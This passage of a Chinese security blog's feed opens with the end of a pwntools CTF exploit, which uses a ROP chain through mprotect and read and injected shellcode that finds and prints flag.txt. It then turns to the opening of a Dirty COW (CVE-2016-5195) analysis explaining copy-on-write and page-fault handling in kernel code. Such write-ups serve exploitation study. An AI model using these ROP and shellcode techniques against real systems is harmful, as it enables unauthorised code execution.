<a class="sourceLine" id="cb1-32" title="32">pop_rdx <span class="op">=</span> <span class="bn">0x0000000000120272</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-33" title="33">pop_rdi <span class="op">=</span> <span class="bn">0x000000000002e6c5</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-34" title="34">pop_rsi <span class="op">=</span> <span class="bn">0x0000000000030081</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-35" title="35">syscall <span class="op">=</span> <span class="bn">0x0000000000095196</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-36" title="36"></a>
<a class="sourceLine" id="cb1-37" title="37">payload <span class="op">=</span> flat(</a>
<a class="sourceLine" id="cb1-38" title="38">    tls_canary,</a>
<a class="sourceLine" id="cb1-39" title="39">    <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="bn">0x58</span>,</a>
<a class="sourceLine" id="cb1-40" title="40">    pop_rdi, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-41" title="41">    syscall</a>
<a class="sourceLine" id="cb1-42" title="42">)</a>
<a class="sourceLine" id="cb1-43" title="43"></a>
<a class="sourceLine" id="cb1-44" title="44">p.sendafter(<span class="st">&quot;name:&quot;</span>, payload)</a>
<a class="sourceLine" id="cb1-45" title="45">payload <span class="op">=</span> flat(</a>
<a class="sourceLine" id="cb1-46" title="46">    <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="dv">8</span>,</a>
<a class="sourceLine" id="cb1-47" title="47">    <span class="st">&#39;C&#39;</span><span class="op">*</span><span class="bn">0x21d0</span>,</a>
<a class="sourceLine" id="cb1-48" title="48">)</a>
<a class="sourceLine" id="cb1-49" title="49">payload <span class="op">+=</span> flat(</a>
<a class="sourceLine" id="cb1-50" title="50">    <span class="co"># mprotect</span></a>
<a class="sourceLine" id="cb1-51" title="51">    pop_rax, <span class="bn">0xa</span>,</a>
<a class="sourceLine" id="cb1-52" title="52">    pop_rdi, libc.address <span class="op">+</span> <span class="bn">0x21a000</span>,</a>
<a class="sourceLine" id="cb1-53" title="53">    pop_rsi, <span class="bn">0x1000</span>,</a>
<a class="sourceLine" id="cb1-54" title="54">    pop_rdx, <span class="dv">7</span>,</a>
<a class="sourceLine" id="cb1-55" title="55">    syscall,</a>
<a class="sourceLine" id="cb1-56" title="56"></a>
<a class="sourceLine" id="cb1-57" title="57">    <span class="co"># read(0,libc.address + 0x21a000,0x1000)</span></a>
<a class="sourceLine" id="cb1-58" title="58">    pop_rdi, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-59" title="59">    pop_rsi, libc.address <span class="op">+</span> <span class="bn">0x21a800</span>,</a>
<a class="sourceLine" id="cb1-60" title="60">    pop_rdx, <span class="bn">0x1000</span>,</a>
<a class="sourceLine" id="cb1-61" title="61">    pop_rax, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-62" title="62">    syscall,</a>
<a class="sourceLine" id="cb1-63" title="63"></a>
<a class="sourceLine" id="cb1-64" title="64">    <span class="co"># exec shellcode</span></a>
<a class="sourceLine" id="cb1-65" title="65">    libc.address <span class="op">+</span> <span class="bn">0x21a801</span></a>
<a class="sourceLine" id="cb1-66" title="66">)</a>
<a class="sourceLine" id="cb1-67" title="67"></a>
<a class="sourceLine" id="cb1-68" title="68"></a>
<a class="sourceLine" id="cb1-69" title="69">debug(p,<span class="st">&quot;b *&quot;</span><span class="op">+</span><span class="bu">hex</span>(libc.address <span class="op">+</span> <span class="bn">0x21a800</span>))</a>
<a class="sourceLine" id="cb1-70" title="70"><span class="co"># pause()</span></a>
<a class="sourceLine" id="cb1-71" title="71">p.sendafter(<span class="st">&quot;Data:&quot;</span>, payload)</a>
<a class="sourceLine" id="cb1-72" title="72">shellcode <span class="op">=</span> asm(<span class="st">&quot;&quot;&quot;</span></a>
<a class="sourceLine" id="cb1-73" title="73"><span class="st">    // x86  arg[0]=ebx arg[1]=ecx arg[2]=edx arg[3]=esi arg[4]=edi  arg[5]=ebp</span></a>
<a class="sourceLine" id="cb1-74" title="74"><span class="st">    //  mmap2(0x500000, 0x5000, 3, 1048610, 0, 0)</span></a>
<a class="sourceLine" id="cb1-75" title="75"><span class="st">    mov rax, 0xc0</span></a>
<a class="sourceLine" id="cb1-76" title="76"><span class="st">    mov rbx, 0x500000</span></a>
<a class="sourceLine" id="cb1-77" title="77"><span class="st">    mov rcx, 0x5000</span></a>
<a class="sourceLine" id="cb1-78" title="78"><span class="st">    mov rdx, 3</span></a>
<a class="sourceLine" id="cb1-79" title="79"><span class="st">    mov rsi, 1048610</span></a>
<a class="sourceLine" id="cb1-80" title="80"><span class="st">    xor rdi, rdi</span></a>
<a class="sourceLine" id="cb1-81" title="81"><span class="st">    xor rbp, rbp</span></a>
<a class="sourceLine" id="cb1-82" title="82"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-83" title="83"></a>
<a class="sourceLine" id="cb1-84" title="84"><span class="st">    mov rsp,0x500a00</span></a>
<a class="sourceLine" id="cb1-85" title="85"></a>
<a class="sourceLine" id="cb1-86" title="86"><span class="st">    // 5 ==&gt; 64bit:fstat   32bit:open</span></a>
<a class="sourceLine" id="cb1-87" title="87"><span class="st">    // open(&quot;.&quot;, 0, 0)</span></a>
<a class="sourceLine" id="cb1-88" title="88"><span class="st">    mov rax, 5</span></a>
<a class="sourceLine" id="cb1-89" title="89"><span class="st">    push 0x2e </span></a>
<a class="sourceLine" id="cb1-90" title="90"><span class="st">    mov rbx, rsp</span></a>
<a class="sourceLine" id="cb1-91" title="91"><span class="st">    xor rcx, rcx</span></a>
<a class="sourceLine" id="cb1-92" title="92"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-93" title="93"></a>
<a class="sourceLine" id="cb1-94" title="94"><span class="st">    // getents(fd1, $rsp, 0x1337)</span></a>
<a class="sourceLine" id="cb1-95" title="95"><span class="st">    mov rbx, rax</span></a>
<a class="sourceLine" id="cb1-96" title="96"><span class="st">    mov rax, 0x8d</span></a>
<a class="sourceLine" id="cb1-97" title="97"><span class="st">    mov rcx, rsp</span></a>
<a class="sourceLine" id="cb1-98" title="98"><span class="st">    mov rdx, 0x1337</span></a>
<a class="sourceLine" id="cb1-99" title="99"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-100" title="100"></a>
<a class="sourceLine" id="cb1-101" title="101"><span class="st">    // rsp+0x7e ==&gt;  flag.txt</span></a>
<a class="sourceLine" id="cb1-102" title="102"><span class="st">    mov rbx, rsp</span></a>
<a class="sourceLine" id="cb1-103" title="103"><span class="st">    add rbx, 0x7e</span></a>
<a class="sourceLine" id="cb1-104" title="104"></a>
<a class="sourceLine" id="cb1-105" title="105"><span class="st">    // open</span></a>
<a class="sourceLine" id="cb1-106" title="106"><span class="st">    mov rax, 5</span></a>
<a class="sourceLine" id="cb1-107" title="107"><span class="st">    xor rcx, rcx</span></a>
<a class="sourceLine" id="cb1-108" title="108"><span class="st">    xor rdx, rdx</span></a>
<a class="sourceLine" id="cb1-109" title="109"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-110" title="110"></a>
<a class="sourceLine" id="cb1-111" title="111"><span class="st">    // RW</span></a>
<a class="sourceLine" id="cb1-112" title="112"><span class="st">    mov rdi, rax</span></a>
<a class="sourceLine" id="cb1-113" title="113"><span class="st">    mov rsi, rsp</span></a>
<a class="sourceLine" id="cb1-114" title="114"><span class="st">    mov rdx, 0x100</span></a>
<a class="sourceLine" id="cb1-115" title="115"><span class="st">    xor rax, rax</span></a>
<a class="sourceLine" id="cb1-116" title="116"><span class="st">    syscall</span></a>
<a class="sourceLine" id="cb1-117" title="117"></a>
<a class="sourceLine" id="cb1-118" title="118"><span class="st">    mov rdi, 1</span></a>
<a class="sourceLine" id="cb1-119" title="119"><span class="st">    mov rax, 1</span></a>
<a class="sourceLine" id="cb1-120" title="120"><span class="st">    syscall</span></a>
<a class="sourceLine" id="cb1-121" title="121"><span class="st">&quot;&quot;&quot;</span>, arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-122" title="122">sleep(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb1-123" title="123">p.sendafter(b<span class="st">&#39;Hello World Setup Wizard</span><span class="ch">\n\x1b</span><span class="st">[0m&#39;</span>, <span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span><span class="op">+</span>shellcode)</a>
<a class="sourceLine" id="cb1-124" title="124"></a>
<a class="sourceLine" id="cb1-125" title="125"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb1-126" title="126">p.interactive()</a></code></pre></div>]]></description>
    <pubDate>Tue, 11 Oct 2022 16:59:01 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[ 关于我]]></title>
    <link>https://blog.mark0519.com/#//#/about</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/about</guid>
    <description><![CDATA[<h2 id="关于我">关于我</h2>
<blockquote>
<p>About me</p>
</blockquote>
<p>Mark / Mark0519 / M4rk，Pwner@天枢Duble</p>
<h2 id="联系我">联系我</h2>
<blockquote>
<p>Contact me</p>
</blockquote>
<p><a href="https://github.com/mark0519">Github</a></p>
<p><a href="mailto:sunjiajun@bupt.edu.cn">E-mail</a></p>]]></description>
    <pubDate>Sun, 9 Oct 2022 13:29:19 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[CVE-2016-5195 复现&分析]]></title>
    <link>https://blog.mark0519.com/#//#/220929-CVE_2016_5195</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/220929-CVE_2016_5195</guid>
    <description><![CDATA[<h1 id="cve-2016-5195-复现分析">CVE-2016-5195 复现&amp;分析</h1>
<blockquote>
<p>CVE-2016-5195 也就是平时所说的“脏牛” “dirtyCOW”</p>
</blockquote>
<p>[TOC]</p>
<h2 id="x00-pre">0x00 Pre</h2>
<h3 id="写时复制机制copy-on-write">[1] 写时复制机制（Copy-on-Write）</h3>
<blockquote>
<p>写入时复制（COW），有时也称为隐式共享，是一种计算机管理中用来有效地对可修改资源执行“复制”操作的资源管理技术。</p>
<p>如果资源重复但未修改，则无需创建新资源，资源可以在副本和原始副本之间共享。</p>
<p>修改仍然必须创建一个副本，因此使用COW，可以将复制操作推迟到第一次写入。</p>
<p>通过以这种方式共享资源，可以显着减少未修改副本的资源消耗，当然了资源修改操作的时候也会增加少量开销。</p>
</blockquote>
<h4 id="基础cow">1.基础COW</h4>
<p>Linux下传统的fork调用时，子线程会复制父线程的数据段，堆栈段的虚拟内存，重新映射到新的物理内存，共享只读的代码地址虚拟和物理空间</p>
<p><img src="https://pic1.imgdb.cn/item/63350b1b16f2c2beb1f82206.png" /></p>
<p>而为了减少内存开销，后来的Linux系统引入了COW机制，也就是[写时复制]</p>
<p><strong>「父进程与子进程共享所有的页框」而不是直接为子进程分配新的页框，「只有当任意一方尝试修改某个页框」的内容时内核才会为其分配一个新的页框，并将原页框中内容进行复制</strong></p>
<ul>
<li>在 <code>fork()</code> 系统调用之后，父子进程共享所有的页框，内核会将这些页框<strong>全部标为read-only</strong></li>
<li>由于所有页框被标为<strong>只读</strong>，当任意一方尝试修改某个页框时，便会触发<strong>「缺页异常」</strong>（page fault）——此时内核才会为其分配一个新的页框</li>
</ul>
<p>只有当某个进程尝试修改共享内存时，内核才会为其分配新的页框，以此大幅度减少系统的开销，达到性能优化的效果</p>
<p><img src="https://pic1.imgdb.cn/item/63350c3716f2c2beb1f92d2b.png" /></p>
<h4 id="mmap和cow">2. mmap和cow</h4>
<p>同样地，若是我们使用 mmap 映射了一个只具有读权限而不具有写权限的文件，当我们尝试向 mmap 映射区域写入内容时，也会触发写时复制机制，将该文件内容拷贝一份到内存中，此时进程对这块区域的读写操作便不会影响到硬盘上的文件</p>
<h3 id="缺页异常page-fault">[2] 缺页异常（page fault）</h3>
<blockquote>
<p>从内核角度来看，逻辑地址和物理地址都被划分成为固定大小的页面。每个合法的逻辑页面敲好处于一个物理页面中，方便MMU的地址转换。<strong>当地址转换无法完成时(例如由于给定的逻辑地址不合法或由于逻辑页面没有对应的物理页面)，MMU将产生中断，向核心发出信号。Linux核心可以处理这种页面错误(<code>Page Fault</code>)问题</strong>。</p>
</blockquote>
<p>主要触发的情况如下：</p>
<ol type="1">
<li>地址空间映射关系未建立 1.1：malloc/mmap申请虚拟的地址空间并未分配实际物理页，首次访问触发缺页异常。</li>
<li>地址空间映射关系已建立 2.1：要访问的页面已经被swapping到了磁盘，访问时触发缺页异常。 2.2：fork子进程时，子进程共享父进程的地址空间，写是触发缺页异常(COW技术)。 2.3：要访问的页面被KSM合并，写时触发缺页异常(COW技术)。 2.4：兼容的ARM32体系架构模拟PTE_DIRTY PTE_YOUNG比特。</li>
<li>访问的地址空间不合法 3.1：用户空间访问内核空间地址，触发缺页异常。 3.2：内核空间访问用户空间地址，触发缺页异常。(不包括copy_to/from_user的情况)</li>
</ol>
<p><img src="https://lrita.github.io/images/posts/memory/page-fault-interrupt.png" /></p>
<h4 id="分配页表项__handle_mm_fault">1. 分配页表项：__handle_mm_fault()</h4>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1"><span class="co">/*</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="co"> * By the time we get here, we already hold the mm semaphore</span></a>
<a class="sourceLine" id="cb1-3" title="3"><span class="co"> *</span></a>
<a class="sourceLine" id="cb1-4" title="4"><span class="co"> * The mmap_sem may have been released depending on flags and our</span></a>
<a class="sourceLine" id="cb1-5" title="5"><span class="co"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></a>
<a class="sourceLine" id="cb1-6" title="6"><span class="co"> */</span></a>
<a class="sourceLine" id="cb1-7" title="7"><span class="dt">static</span> <span class="dt">int</span> __handle_mm_fault(<span class="kw">struct</span> mm_struct *mm, <span class="kw">struct</span> vm_area_struct *vma,</a>
<a class="sourceLine" id="cb1-8" title="8">                 <span class="dt">unsigned</span> <span class="dt">long</span> address, <span class="dt">unsigned</span> <span class="dt">int</span> flags)</a>
<a class="sourceLine" id="cb1-9" title="9">{</a>
<a class="sourceLine" id="cb1-10" title="10">    <span class="co">//Linux使用四级页表结构</span></a>
<a class="sourceLine" id="cb1-11" title="11">    pgd_t *pgd;<span class="co">//页全局目录项</span></a>
<a class="sourceLine" id="cb1-12" title="12">    pud_t *pud;<span class="co">//页上级目录项</span></a>
<a class="sourceLine" id="cb1-13" title="13">    pmd_t *pmd;<span class="co">//页中间目录项</span></a>
<a class="sourceLine" id="cb1-14" title="14">    pte_t *pte;<span class="co">//页表项</span></a>
<a class="sourceLine" id="cb1-15" title="15">    </a>
<a class="sourceLine" id="cb1-16" title="16">    <span class="co">//以下为页表相关处理</span></a>
<a class="sourceLine" id="cb1-17" title="17"></a>
<a class="sourceLine" id="cb1-18" title="18">    <span class="cf">if</span> (unlikely(is_vm_hugetlb_page(vma)))</a>
<a class="sourceLine" id="cb1-19" title="19">        <span class="cf">return</span> hugetlb_fault(mm, vma, address, flags);</a>
<a class="sourceLine" id="cb1-20" title="20"></a>
<a class="sourceLine" id="cb1-21" title="21">    pgd = pgd_offset(mm, address);<span class="co">//获取全局页表项</span></a>
<a class="sourceLine" id="cb1-22" title="22">    pud = pud_alloc(mm, pgd, address);<span class="co">//分配上级页表项（分配一页新的内存作为pud）</span></a>
<a class="sourceLine" id="cb1-23" title="23">    <span class="cf">if</span> (!pud)<span class="co">//失败了，返回</span></a>
<a class="sourceLine" id="cb1-24" title="24">        <span class="cf">return</span> VM_FAULT_OOM;</a>
<a class="sourceLine" id="cb1-25" title="25">    pmd = pmd_alloc(mm, pud, address);<span class="co">//分配中间页表项分配一页新的内存作为pmd）</span></a>
<a class="sourceLine" id="cb1-26" title="26">    <span class="cf">if</span> (!pmd)<span class="co">//失败了，返回</span></a>
<a class="sourceLine" id="cb1-27" title="27">        <span class="cf">return</span> VM_FAULT_OOM;</a>
<a class="sourceLine" id="cb1-28" title="28">    <span class="cf">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) {</a>
<a class="sourceLine" id="cb1-29" title="29">        <span class="dt">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);<span class="co">//创建页表中间项？</span></a>
<a class="sourceLine" id="cb1-30" title="30">        <span class="cf">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<span class="co">//失败了，返回</span></a>
<a class="sourceLine" id="cb1-31" title="31">            <span class="cf">return</span> ret;</a>
<a class="sourceLine" id="cb1-32" title="32">    } <span class="cf">else</span> {</a>
<a class="sourceLine" id="cb1-33" title="33">        pmd_t orig_pmd = *pmd;</a>
<a class="sourceLine" id="cb1-34" title="34">        <span class="dt">int</span> ret;</a>
<a class="sourceLine" id="cb1-35" title="35"></a>
<a class="sourceLine" id="cb1-36" title="36">        barrier();</a>
<a class="sourceLine" id="cb1-37" title="37">        <span class="cf">if</span> (pmd_trans_huge(orig_pmd)) {</a>
<a class="sourceLine" id="cb1-38" title="38">            <span class="dt">unsigned</span> <span class="dt">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</a>
<a class="sourceLine" id="cb1-39" title="39"></a>
<a class="sourceLine" id="cb1-40" title="40">            <span class="co">/*</span></a>
<a class="sourceLine" id="cb1-41" title="41"><span class="co">             * If the pmd is splitting, return and retry the</span></a>
<a class="sourceLine" id="cb1-42" title="42"><span class="co">             * the fault.  Alternative: wait until the split</span></a>
<a class="sourceLine" id="cb1-43" title="43"><span class="co">             * is done, and goto retry.</span></a>
<a class="sourceLine" id="cb1-44" title="44"><span class="co">             */</span></a>
<a class="sourceLine" id="cb1-45" title="45">            <span class="cf">if</span> (pmd_trans_splitting(orig_pmd))</a>
<a class="sourceLine" id="cb1-46" title="46">                <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-47" title="47"></a>
<a class="sourceLine" id="cb1-48" title="48">            <span class="cf">if</span> (pmd_protnone(orig_pmd))</a>
<a class="sourceLine" id="cb1-49" title="49">                <span class="cf">return</span> do_huge_pmd_numa_page(mm, vma, address,</a>
<a class="sourceLine" id="cb1-50" title="50">                                 orig_pmd, pmd);</a>
<a class="sourceLine" id="cb1-51" title="51"></a>
<a class="sourceLine" id="cb1-52" title="52">            <span class="cf">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) {</a>
<a class="sourceLine" id="cb1-53" title="53">                ret = wp_huge_pmd(mm, vma, address, pmd,</a>
<a class="sourceLine" id="cb1-54" title="54">                            orig_pmd, flags);</a>
<a class="sourceLine" id="cb1-55" title="55">                <span class="cf">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</a>
<a class="sourceLine" id="cb1-56" title="56">                    <span class="cf">return</span> ret;</a>
<a class="sourceLine" id="cb1-57" title="57">            } <span class="cf">else</span> {</a>
<a class="sourceLine" id="cb1-58" title="58">                huge_pmd_set_accessed(mm, vma, address, pmd,</a>
<a class="sourceLine" id="cb1-59" title="59">                              orig_pmd, dirty);</a>
<a class="sourceLine" id="cb1-60" title="60">                <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-61" title="61">            }</a>
<a class="sourceLine" id="cb1-62" title="62">        }</a>
<a class="sourceLine" id="cb1-63" title="63">    }</a>
<a class="sourceLine" id="cb1-64" title="64"></a>
<a class="sourceLine" id="cb1-65" title="65">    <span class="co">/*</span></a>
<a class="sourceLine" id="cb1-66" title="66"><span class="co">     * Use __pte_alloc instead of pte_alloc_map, because we can&#39;t</span></a>
<a class="sourceLine" id="cb1-67" title="67"><span class="co">     * run pte_offset_map on the pmd, if an huge pmd could</span></a>
<a class="sourceLine" id="cb1-68" title="68"><span class="co">     * materialize from under us from a different thread.</span></a>
<a class="sourceLine" id="cb1-69" title="69"><span class="co">     */</span></a>
<a class="sourceLine" id="cb1-70" title="70">    <span class="cf">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</a>
<a class="sourceLine" id="cb1-71" title="71">        unlikely(__pte_alloc(mm, vma, pmd, address)))</a>
<a class="sourceLine" id="cb1-72" title="72">        <span class="cf">return</span> VM_FAULT_OOM;</a>
<a class="sourceLine" id="cb1-73" title="73">    <span class="co">/* if an huge pmd materialized from under us just retry later */</span></a>
<a class="sourceLine" id="cb1-74" title="74">    <span class="cf">if</span> (unlikely(pmd_trans_huge(*pmd)))</a>
<a class="sourceLine" id="cb1-75" title="75">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-76" title="76">    <span class="co">/*</span></a>
<a class="sourceLine" id="cb1-77" title="77"><span class="co">     * A regular pmd is established and it can&#39;t morph into a huge pmd</span></a>
<a class="sourceLine" id="cb1-78" title="78"><span class="co">     * from under us anymore at this point because we hold the mmap_sem</span></a>
<a class="sourceLine" id="cb1-79" title="79"><span class="co">     * read mode and khugepaged takes it in write mode. So now it&#39;s</span></a>
<a class="sourceLine" id="cb1-80" title="80"><span class="co">     * safe to run pte_offset_map().</span></a>
<a class="sourceLine" id="cb1-81" title="81"><span class="co">     */</span></a>
<a class="sourceLine" id="cb1-82" title="82">    pte = pte_offset_map(pmd, address);<span class="co">//获取到最终的页表项</span></a>
<a class="sourceLine" id="cb1-83" title="83"></a>
<a class="sourceLine" id="cb1-84" title="84">    <span class="cf">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);<span class="co">//核心处理函数</span></a>
<a class="sourceLine" id="cb1-85" title="85">}</a></code></pre></div>
<p>该函数为触发缺页异常的线性地址address分配各级的页目录，在这里的pgd表会直接使用该进程的 <code>mm_struct</code> 中的 pgd 表，但是pud、pmd表都存在着创建新表的可能</p>
<p>此时我们已经有了与触发缺页异常的地址相对应的页表项（PTE），接下来我们将进入 <code>handle_pte_fault()</code> 函数进行下一步</p>
<h4 id="处理页表项handle_pte_fault">2. 处理页表项：handle_pte_fault()</h4>
<p>该函数同样定义于 <code>mm/memory.c</code> 中，如下：</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1"><span class="co">/*</span></a>
<a class="sourceLine" id="cb2-2" title="2"><span class="co"> * These routines also need to handle stuff like marking pages dirty</span></a>
<a class="sourceLine" id="cb2-3" title="3"><span class="co"> * and/or accessed for architectures that don&#39;t do it in hardware (most</span></a>
<a class="sourceLine" id="cb2-4" title="4"><span class="co"> * RISC architectures).  The early dirtying is also good on the i386.</span></a>
<a class="sourceLine" id="cb2-5" title="5"><span class="co"> *</span></a>
<a class="sourceLine" id="cb2-6" title="6"><span class="co"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span></a>
<a class="sourceLine" id="cb2-7" title="7"><span class="co"> * with external mmu caches can use to update those (ie the Sparc or</span></a>
<a class="sourceLine" id="cb2-8" title="8"><span class="co"> * PowerPC hashed page tables that act as extended TLBs).</span></a>
<a class="sourceLine" id="cb2-9" title="9"><span class="co"> *</span></a>
<a class="sourceLine" id="cb2-10" title="10"><span class="co"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></a>
<a class="sourceLine" id="cb2-11" title="11"><span class="co"> * but allow concurrent faults), and pte mapped but not yet locked.</span></a>
<a class="sourceLine" id="cb2-12" title="12"><span class="co"> * We return with pte unmapped and unlocked.</span></a>
<a class="sourceLine" id="cb2-13" title="13"><span class="co"> *</span></a>
<a class="sourceLine" id="cb2-14" title="14"><span class="co"> * The mmap_sem may have been released depending on flags and our</span></a>
<a class="sourceLine" id="cb2-15" title="15"><span class="co"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></a>
<a class="sourceLine" id="cb2-16" title="16"><span class="co"> */</span></a>
<a class="sourceLine" id="cb2-17" title="17"><span class="dt">static</span> <span class="dt">int</span> handle_pte_fault(<span class="kw">struct</span> mm_struct *mm,</a>
<a class="sourceLine" id="cb2-18" title="18">             <span class="kw">struct</span> vm_area_struct *vma, <span class="dt">unsigned</span> <span class="dt">long</span> address,</a>
<a class="sourceLine" id="cb2-19" title="19">             pte_t *pte, pmd_t *pmd, <span class="dt">unsigned</span> <span class="dt">int</span> flags)</a>
<a class="sourceLine" id="cb2-20" title="20">{</a>
<a class="sourceLine" id="cb2-21" title="21">    pte_t entry;</a>
<a class="sourceLine" id="cb2-22" title="22">    spinlock_t *ptl;</a>
<a class="sourceLine" id="cb2-23" title="23"></a>
<a class="sourceLine" id="cb2-24" title="24">    <span class="co">/*</span></a>
<a class="sourceLine" id="cb2-25" title="25"><span class="co">     * some architectures can have larger ptes than wordsize,</span></a>
<a class="sourceLine" id="cb2-26" title="26"><span class="co">     * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></a>
<a class="sourceLine" id="cb2-27" title="27"><span class="co">     * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></a>
<a class="sourceLine" id="cb2-28" title="28"><span class="co">     * The code below just needs a consistent view for the ifs and</span></a>
<a class="sourceLine" id="cb2-29" title="29"><span class="co">     * we later double check anyway with the ptl lock held. So here</span></a>
<a class="sourceLine" id="cb2-30" title="30"><span class="co">     * a barrier will do.</span></a>
<a class="sourceLine" id="cb2-31" title="31"><span class="co">     */</span></a>
<a class="sourceLine" id="cb2-32" title="32">    entry = *pte;<span class="co">//获取页表项中的内存页</span></a>
<a class="sourceLine" id="cb2-33" title="33">    barrier();</a>
<a class="sourceLine" id="cb2-34" title="34">    <span class="co">//该页不在主存中</span></a>
<a class="sourceLine" id="cb2-35" title="35">    <span class="cf">if</span> (!pte_present(entry)) {<span class="co">//pte中内存页所映射的物理地址（*pte）不存在，可能是调页请求</span></a>
<a class="sourceLine" id="cb2-36" title="36">        <span class="cf">if</span> (pte_none(entry)) {<span class="co">//pte中内容为空，表示进程第一次访问该页</span></a>
<a class="sourceLine" id="cb2-37" title="37">            <span class="cf">if</span> (vma_is_anonymous(vma))<span class="co">//vma为匿名区域，分配物理页框，初始化为全0</span></a>
<a class="sourceLine" id="cb2-38" title="38">                <span class="cf">return</span> do_anonymous_page(mm, vma, address,</a>
<a class="sourceLine" id="cb2-39" title="39">                             pte, pmd, flags);</a>
<a class="sourceLine" id="cb2-40" title="40">            <span class="cf">else</span></a>
<a class="sourceLine" id="cb2-41" title="41">                <span class="cf">return</span> do_fault(mm, vma, address, pte, pmd,</a>
<a class="sourceLine" id="cb2-42" title="42">                        flags, entry);<span class="co">//非匿名区域，分配物理页框</span></a>
<a class="sourceLine" id="cb2-43" title="43">        }</a>
<a class="sourceLine" id="cb2-44" title="44">        <span class="cf">return</span> do_swap_page(mm, vma, address,</a>
<a class="sourceLine" id="cb2-45" title="45">                    pte, pmd, flags, entry);<span class="co">//说明该页之前存在于主存中，但是被换到外存了（太久没用被放到了交换空间里？），那就再换回来就行</span></a>
<a class="sourceLine" id="cb2-46" title="46">    }</a>
<a class="sourceLine" id="cb2-47" title="47"></a>
<a class="sourceLine" id="cb2-48" title="48">    <span class="co">//该页在主存中</span></a>
<a class="sourceLine" id="cb2-49" title="49">    <span class="cf">if</span> (pte_protnone(entry)) <span class="co">// 查看 pte 是否有 _PAGE_PROTNONE 标志位</span></a>
<a class="sourceLine" id="cb2-50" title="50">        <span class="cf">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</a>
<a class="sourceLine" id="cb2-51" title="51"></a>
<a class="sourceLine" id="cb2-52" title="52">    ptl = pte_lockptr(mm, pmd);</a>
<a class="sourceLine" id="cb2-53" title="53">    spin_lock(ptl);<span class="co">//自旋锁，多线程操作</span></a>
<a class="sourceLine" id="cb2-54" title="54">    <span class="cf">if</span> (unlikely(!pte_same(*pte, entry)))</a>
<a class="sourceLine" id="cb2-55" title="55">        <span class="cf">goto</span> unlock;</a>
<a class="sourceLine" id="cb2-56" title="56">    <span class="cf">if</span> (flags &amp; FAULT_FLAG_WRITE) {<span class="co">// 存在 FAULT_FLAG_WRITE 标志位，表示缺页异常由写操作引起</span></a>
<a class="sourceLine" id="cb2-57" title="57">        <span class="cf">if</span> (!pte_write(entry))<span class="co">//对应的页不可写</span></a>
<a class="sourceLine" id="cb2-58" title="58">            <span class="cf">return</span> do_wp_page(mm, vma, address,</a>
<a class="sourceLine" id="cb2-59" title="59">                    pte, pmd, ptl, entry);<span class="co">//进行写时复制，将内容写入由 do_fault()-&gt;do_cow_fault()分配的内存页中</span></a>
<a class="sourceLine" id="cb2-60" title="60">        entry = pte_mkdirty(entry);<span class="co">//将该页【标脏】</span></a>
<a class="sourceLine" id="cb2-61" title="61">    }</a>
<a class="sourceLine" id="cb2-62" title="62">    entry = pte_mkyoung(entry);<span class="co">//将该页标干净？</span></a>
<a class="sourceLine" id="cb2-63" title="63">    <span class="cf">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) {</a>
<a class="sourceLine" id="cb2-64" title="64">        update_mmu_cache(vma, address, pte);<span class="co">//pte内容发生变化，将新内容写入pte页表项中</span></a>
<a class="sourceLine" id="cb2-65" title="65">    } <span class="cf">else</span> {</a>
<a class="sourceLine" id="cb2-66" title="66">        <span class="co">/*</span></a>
<a class="sourceLine" id="cb2-67" title="67"><span class="co">         * This is needed only for protection faults but the arch code</span></a>
<a class="sourceLine" id="cb2-68" title="68"><span class="co">         * is not yet telling us if this is a protection fault or not.</span></a>
<a class="sourceLine" id="cb2-69" title="69"><span class="co">         * This still avoids useless tlb flushes for .text page faults</span></a>
<a class="sourceLine" id="cb2-70" title="70"><span class="co">         * with threads.</span></a>
<a class="sourceLine" id="cb2-71" title="71"><span class="co">         */</span></a>
<a class="sourceLine" id="cb2-72" title="72">        <span class="cf">if</span> (flags &amp; FAULT_FLAG_WRITE)</a>
